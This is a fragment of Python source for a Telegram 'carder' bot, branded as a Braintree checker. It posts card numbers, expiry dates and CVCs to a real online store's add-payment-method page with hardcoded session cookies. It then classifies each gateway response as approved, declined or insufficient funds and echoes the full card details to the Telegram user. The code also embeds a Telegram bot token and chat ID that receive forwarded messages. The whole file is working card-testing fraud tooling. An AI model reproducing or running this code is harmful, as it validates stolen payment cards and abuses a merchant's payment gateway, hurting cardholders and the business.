            'wfwaf-authcookie-98378724241a3d95191bebf32899230c': '100676%7Cother%7Cread',
            'sbjs_session': 'pgs%3D7%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fglasshousesupply.com%2Fmy-account%2Fadd-payment-method%2F',
        }

        headers = {
            'authority': 'glasshousesupply.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7,fr-FR;q=0.6,fr;q=0.5',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://glasshousesupply.com',
            'referer': 'https://glasshousesupply.com/my-account/add-payment-method/',
            'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': user_agent,
        }

        response = requests.get(
            "https://glasshousesupply.com/my-account/add-payment-method/",
            cookies=cookies,
            headers=headers,
        )

        # Skip token fetching and assume we proceed with dummy or mock data
        tok = n[:6]  # Just using the BIN as a dummy token

        data = {
            'payment_method': 'braintree_cc',
            'braintree_cc_nonce_key': tok,
            'braintree_cc_device_data': '{"device_session_id":"f3b62b2059128666273f76de659fb76e","fraud_merchant_id":null,"correlation_id":"e9be3974-e5c7-45b9-b04f-89b98060"}',
            'braintree_cc_3ds_nonce_key': '',
            'braintree_cc_config_data': 'dummy_config_data',
            'woocommerce-add-payment-method-nonce': 'ba76a0b9ff',
            '_wp_http_referer': '/my-account/add-payment-method/',
            'woocommerce_add_payment_method': '1',
        }

        response = requests.post(
            "https://glasshousesupply.com/my-account/add-payment-method/",
            cookies=cookies,
            headers=headers,
            data=data,
        )

        soup = BeautifulSoup(response.text, "html.parser")
        error_msg = soup.find("ul", class_="woocommerce-error")

        # Improved error detection
        if error_msg:
            error_text = error_msg.text.strip()
            if "Declined" in error_text:
                status = "❌ Declined"
            elif "No Account" in error_text:
                status = "⚠️ No Account"
            elif "Processor Declined" in error_text:
                status = "🚫 Processor Declined"
            elif "invalid card" in error_text.lower():
                status = "⚠️ Invalid Card"
            elif "Insufficient funds" in error_text:
                status = "⚠️ Insufficient Funds"
            else:
                status = "❌ Unknown Decline"
        else:
            status = "✅ Approved"

        # Generate response text
        response_text = f"""
╭─━━━━━━━━━━━━━━━━━━━─╮
    🎩 𝘽𝙍𝘼𝙄𝙉𝙏𝙍𝙀𝙀 𝘾𝙃𝙀𝘾𝙆𝙀𝙍 🎩
╰─━━━━━━━━━━━━━━━━━━━─╮

📌 **Card:** `{n}|{mm}|{yy}|{cvc}`
📌 **Status:** {status}
📌 **Gateway:** `Braintree Auth`
📌 **BIN:** `{tok[:6]}`
📌 **Bank:** `{bank_name}` 
📌 **Type:** `{card_type}`
📌 **Country:** `{country_name} {country_flag}`
📌 **Checked By:** `@{message.from_user.username}`
📌 **Response Time:** `{round(time.time() - message.date, 2)}s`

╭─━━━━━━━━━━━━━━━─╮
𝑰𝑺𝑨𝑮𝑰 𝑪𝑨𝑹𝑫𝑬𝑹 𝑩𝑶𝑻
╰─━━━━━━━━━━━━━━━─╯
"""
        bot.edit_message_text(response_text, message.chat.id, msg.message_id, parse_mode="Markdown")

    except Exception as e:
        bot.edit_message_text(f"⚠️ An error occurred: {str(e)}", message.chat.id, msg.message_id)


def send_telegram_notification(msg1):
    url = f"https://api.telegram.org/bot7752241245:AAFxmL9QN3C_uwCSouP7YXzyrTfm3LjALQU/sendMessage"
    data = {'chat_id': -1002153133768, 'text': msg1, 'parse_mode': 'HTML'}
    requests.post(url, data=data)
    
bot.infinity_polling()
